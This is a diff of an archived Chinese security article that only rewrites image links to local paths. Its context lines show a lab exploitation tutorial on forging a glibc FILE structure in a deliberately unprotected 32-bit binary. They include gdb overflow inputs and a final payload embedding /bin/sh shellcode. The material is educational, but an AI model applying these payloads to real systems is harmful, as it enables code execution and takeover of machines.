@@ -35,7 +35,7 @@
 
 <p>这张图是 FILE 结构体的构成图。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160206/20160206075828913171.png" alt="p1" /></p>
+<p><img src="../image/drops/20160206/20160206075828913171.png" alt="p1" /></p>
 
 <p>图片来源：<a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a></p>
 
@@ -122,7 +122,7 @@ cc -o fsp fsp.c -m32 -zexecstack -fno-stack-protector
 
 <p>当我用<code>r $(python -c "print 'a'*1041 + 'AAAA'")</code>跑的时候，可以控制 ESI。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160206/201602060758301883024.jpg" alt="p2" /></p>
+<p><img src="../image/drops/20160206/201602060758301883024.jpg" alt="p2" /></p>
 
 <p>如图，ESI 已经被控制成 0x41414141，那么这里就是我们控制的文件指针了。我们把整个文件结构体放在栈上， AAAA 的前面 160 个字节。AAAA 也改成指向文件指针开头的地方。</p>
 
@@ -141,7 +141,7 @@ Found 3 results, display max 3 items:
 r $(python -c "print 'a'*881 + 'B'*160 + '\xec\xd6\xff\xff'")
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160206/201602060758331208933.jpg" alt="p3" /></p>
+<p><img src="../image/drops/20160206/201602060758331208933.jpg" alt="p3" /></p>
 
 <p>报了新的错？没关系，take it easy，现在就开始构造 FILE struct 了。</p>
 
@@ -185,7 +185,7 @@ r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 <p>拿去跑一下，看看有什么问题没有。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160206/201602060758359700343.jpg" alt="p4" /></p>
+<p><img src="../image/drops/20160206/201602060758359700343.jpg" alt="p4" /></p>
 
 <p>快看快看，我们到了最后 call 的地方了。</p>
 
@@ -222,7 +222,7 @@ r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 <p>我这里指向了 0xffffd63e 处，加上 0x1c 后（看上面汇编），为 0xffffd6ca。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160206/201602060758369748653.jpg" alt="p5" /></p>
+<p><img src="../image/drops/20160206/201602060758369748653.jpg" alt="p5" /></p>
 
 <p>已经可以控制 eip 了，我们修改一下 0xffffd6ca 处的地址，使其指向 0xffffd6cf，然后 0xffffd6ce-0xffffd6ec 这 30 个字节上放上 shellcode。注意 shellcode 应该正好为 30 个字节，不能多也不能少，少了的话用 <code>\x90</code> 补充（根据实际情况来就好了）。</p>
 
@@ -232,7 +232,7 @@ r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 r "`python -c "print 'a'*847 + '\xcf\xd6\xff\xff' + '\x90'*9 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA\xae\xd6\xff\xff' + '\xec\xd6\xff\xff'"`"
 </code></pre>
 
-<p>执行效果： <img src="http://static.wooyun.org//drops/20160206/201602060758391563963.jpg" alt="p6" /></p>
+<p>执行效果： <img src="../image/drops/20160206/201602060758391563963.jpg" alt="p6" /></p>
 
 <h1>0x03 参考</h1>
 
